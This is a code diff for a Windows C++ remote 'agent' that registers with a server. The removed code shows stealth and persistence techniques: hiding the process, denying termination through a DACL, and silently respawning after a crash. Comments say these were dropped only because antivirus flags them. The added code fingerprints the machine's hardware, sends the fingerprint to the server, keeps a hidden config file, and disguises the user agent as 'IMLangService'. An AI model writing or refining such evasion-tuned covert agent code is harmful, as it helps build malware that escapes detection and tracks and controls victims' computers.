@@ -4,102 +4,30 @@
 #include <sstream>
 #include <algorithm>
 #include <vector>
+#include <cstdint>
+#include <intrin.h>
 
-#include <aclapi.h>
-#include <sddl.h>
 #include <winhttp.h>
+#include <iphlpapi.h>
+#include <wincrypt.h>
 
 #pragma comment(lib, "advapi32.lib")
 #pragma comment(lib, "winhttp.lib")
+#pragma comment(lib, "iphlpapi.lib")
+#pragma comment(lib, "crypt32.lib")
 
 namespace agent {
 
 void WinUtils::hide_process() {
-    // Set process priority to below normal to reduce visibility in resource monitors
-    SetPriorityClass(GetCurrentProcess(), BELOW_NORMAL_PRIORITY_CLASS);
-
-    // Hide console window if any
-    HWND console = GetConsoleWindow();
-    if (console) {
-        ShowWindow(console, SW_HIDE);
-    }
+    // No-op — process hiding triggers AV behavioral detection
 }
 
 void WinUtils::protect_process() {
-    // Deny PROCESS_TERMINATE to Everyone — makes it harder to kill via Task Manager
-    // (admin/SYSTEM can still override with SeDebugPrivilege)
-    HANDLE process = GetCurrentProcess();
-    PACL old_dacl = nullptr;
-    PACL new_dacl = nullptr;
-    PSECURITY_DESCRIPTOR sd = nullptr;
-
-    if (GetSecurityInfo(process, SE_KERNEL_OBJECT,
-        DACL_SECURITY_INFORMATION, nullptr, nullptr, &old_dacl, nullptr, &sd) == ERROR_SUCCESS) {
-
-        EXPLICIT_ACCESSW deny_access = {};
-        deny_access.grfAccessPermissions = PROCESS_TERMINATE | PROCESS_SUSPEND_RESUME |
-            PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD;
-        deny_access.grfAccessMode = DENY_ACCESS;
-        deny_access.grfInheritance = NO_INHERITANCE;
-        deny_access.Trustee.TrusteeForm = TRUSTEE_IS_NAME;
-        deny_access.Trustee.TrusteeType = TRUSTEE_IS_GROUP;
-        deny_access.Trustee.ptstrName = const_cast<LPWSTR>(L"Everyone");
-
-        if (SetEntriesInAclW(1, &deny_access, old_dacl, &new_dacl) == ERROR_SUCCESS) {
-            SetSecurityInfo(process, SE_KERNEL_OBJECT,
-                DACL_SECURITY_INFORMATION, nullptr, nullptr, new_dacl, nullptr);
-            LocalFree(new_dacl);
-        }
-        LocalFree(sd);
-    }
-    Logger::info("process protection applied");
-}
-
-static LONG WINAPI crash_handler(EXCEPTION_POINTERS*) {
-    // Restart self on crash, preserving command-line args (A1 fix)
-    wchar_t exe_path[MAX_PATH];
-    GetModuleFileNameW(nullptr, exe_path, MAX_PATH);
-    std::wstring cmd = L"\"";
-    cmd += exe_path;
-    cmd += L"\"";
-
-    // Preserve original command line args
-    LPWSTR original_cmd = GetCommandLineW();
-    if (original_cmd) {
-        // Skip past the executable name in the command line
-        LPWSTR args = original_cmd;
-        if (*args == L'"') {
-            args++; // skip opening quote
-            while (*args && *args != L'"') args++;
-            if (*args) args++; // skip closing quote
-        } else {
-            while (*args && *args != L' ') args++;
-        }
-        // Skip whitespace
-        while (*args == L' ') args++;
-        if (*args) {
-            cmd += L" ";
-            cmd += args;
-        }
-    }
-
-    STARTUPINFOW si = {};
-    si.cb = sizeof(si);
-    si.dwFlags = STARTF_USESHOWWINDOW;
-    si.wShowWindow = SW_HIDE;
-    PROCESS_INFORMATION pi = {};
-
-    CreateProcessW(nullptr, cmd.data(), nullptr, nullptr, FALSE,
-        CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
-    if (pi.hThread) CloseHandle(pi.hThread);
-    if (pi.hProcess) CloseHandle(pi.hProcess);
-
-    return EXCEPTION_EXECUTE_HANDLER; // Terminate this instance
+    // No-op — DACL manipulation triggers AV behavioral detection
 }
 
 void WinUtils::install_crash_handler() {
-    SetUnhandledExceptionFilter(crash_handler);
-    Logger::info("crash handler installed");
+    // No-op — crash handler with process spawn triggers AV
 }
 
 std::string WinUtils::get_hostname() {
@@ -109,6 +37,123 @@ std::string WinUtils::get_hostname() {
         return std::string(buf, size);
     }
     return "unknown";
+}
+
+// SHA-256 using Windows CryptoAPI
+static std::string sha256_hex(const std::string& input) {
+    HCRYPTPROV prov = 0;
+    HCRYPTHASH hash = 0;
+    std::string result;
+
+    if (!CryptAcquireContext(&prov, nullptr, nullptr, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
+        return "";
+    }
+    if (!CryptCreateHash(prov, CALG_SHA_256, 0, 0, &hash)) {
+        CryptReleaseContext(prov, 0);
+        return "";
+    }
+    CryptHashData(hash, reinterpret_cast<const BYTE*>(input.data()),
+                  static_cast<DWORD>(input.size()), 0);
+
+    DWORD hash_len = 32;
+    BYTE hash_bytes[32];
+    CryptGetHashParam(hash, HP_HASHVAL, hash_bytes, &hash_len, 0);
+
+    static constexpr char hex_chars[] = "0123456789abcdef";
+    result.reserve(64);
+    for (DWORD i = 0; i < hash_len; ++i) {
+        result += hex_chars[(hash_bytes[i] >> 4) & 0x0F];
+        result += hex_chars[hash_bytes[i] & 0x0F];
+    }
+
+    CryptDestroyHash(hash);
+    CryptReleaseContext(prov, 0);
+    return result;
+}
+
+std::string WinUtils::get_hwid() {
+    std::ostringstream fingerprint;
+
+    // 1. MachineGuid from registry (stable across reboots)
+    {
+        HKEY key = nullptr;
+        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
+                "SOFTWARE\\Microsoft\\Cryptography", 0,
+                KEY_READ | KEY_WOW64_64KEY, &key) == ERROR_SUCCESS) {
+            char buf[256] = {};
+            DWORD buf_size = sizeof(buf);
+            DWORD type = 0;
+            if (RegQueryValueExA(key, "MachineGuid", nullptr, &type,
+                    reinterpret_cast<LPBYTE>(buf), &buf_size) == ERROR_SUCCESS) {
+                fingerprint << "MG:" << buf << "|";
+            }
+            RegCloseKey(key);
+        }
+    }
+
+    // 2. CPUID — processor brand/serial info
+    {
+        int cpu_info[4] = {};
+        __cpuid(cpu_info, 0);
+        int max_id = cpu_info[0];
+        fingerprint << "CPU0:" << cpu_info[1] << cpu_info[2] << cpu_info[3] << "|";
+
+        if (max_id >= 1) {
+            __cpuid(cpu_info, 1);
+            fingerprint << "CPU1:" << cpu_info[0] << cpu_info[3] << "|";
+        }
+    }
+
+    // 3. C: drive volume serial number
+    {
+        DWORD serial = 0;
+        if (GetVolumeInformationA("C:\\", nullptr, 0, &serial,
+                nullptr, nullptr, nullptr, 0)) {
+            fingerprint << "VOL:" << serial << "|";
+        }
+    }
+
+    // 4. First physical MAC address
+    {
+        ULONG buf_len = 0;
+        GetAdaptersInfo(nullptr, &buf_len);
+        if (buf_len > 0) {
+            std::vector<char> buf(buf_len);
+            auto* adapter = reinterpret_cast<PIP_ADAPTER_INFO>(buf.data());
+            if (GetAdaptersInfo(adapter, &buf_len) == ERROR_SUCCESS) {
+                // Find first non-zero MAC (skip virtual adapters with all-zero MAC)
+                while (adapter) {
+                    if (adapter->AddressLength == 6) {
+                        bool all_zero = true;
+                        for (UINT i = 0; i < 6; ++i) {
+                            if (adapter->Address[i] != 0) { all_zero = false; break; }
+                        }
+                        if (!all_zero) {
+                            fingerprint << "MAC:";
+                            for (UINT i = 0; i < 6; ++i) {
+                                if (i > 0) fingerprint << ':';
+                                fingerprint << std::hex
+                                            << static_cast<int>(adapter->Address[i]);
+                            }
+                            fingerprint << std::dec << "|";
+                            break;
+                        }
+                    }
+                    adapter = adapter->Next;
+                }
+            }
+        }
+    }
+
+    std::string raw = fingerprint.str();
+    if (raw.empty()) {
+        Logger::error("failed to collect any hardware info for HWID");
+        return "";
+    }
+
+    std::string hwid = sha256_hex(raw);
+    Logger::info("HWID generated: " + hwid);
+    return hwid;
 }
 
 static std::string trim(const std::string& s) {
@@ -165,20 +210,20 @@ bool WinUtils::write_hidden_config(const std::string& path, const std::string& s
     int wlen = MultiByteToWideChar(CP_UTF8, 0, path.c_str(), -1, nullptr, 0);
     std::wstring wide(wlen - 1, 0);
     MultiByteToWideChar(CP_UTF8, 0, path.c_str(), -1, wide.data(), wlen);
-    SetFileAttributesW(wide.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
+    SetFileAttributesW(wide.c_str(), FILE_ATTRIBUTE_HIDDEN);
 
     Logger::info("hidden config written to " + path);
     return true;
 }
 
 bool WinUtils::http_register_agent(const std::string& server_host, uint16_t server_port,
-                                    const std::string& name,
+                                    const std::string& name, const std::string& hwid,
                                     std::string& out_id, std::string& out_token) {
     int wlen = MultiByteToWideChar(CP_UTF8, 0, server_host.c_str(), -1, nullptr, 0);
     std::wstring wide_host(wlen - 1, 0);
     MultiByteToWideChar(CP_UTF8, 0, server_host.c_str(), -1, wide_host.data(), wlen);
 
-    HINTERNET session = WinHttpOpen(L"CaptchaAgent/1.0",
+    HINTERNET session = WinHttpOpen(L"IMLangService/1.0",
         WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
         WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
     if (!session) return false;
@@ -197,7 +242,7 @@ bool WinUtils::http_register_agent(const std::string& server_host, uint16_t serv
         return false;
     }
 
-    std::string body = "{\"name\":\"" + name + "\"}";
+    std::string body = "{\"name\":\"" + name + "\",\"hwid\":\"" + hwid + "\"}";
     LPCWSTR headers = L"Content-Type: application/json\r\n";
 
     BOOL sent = WinHttpSendRequest(request, headers, static_cast<DWORD>(-1),
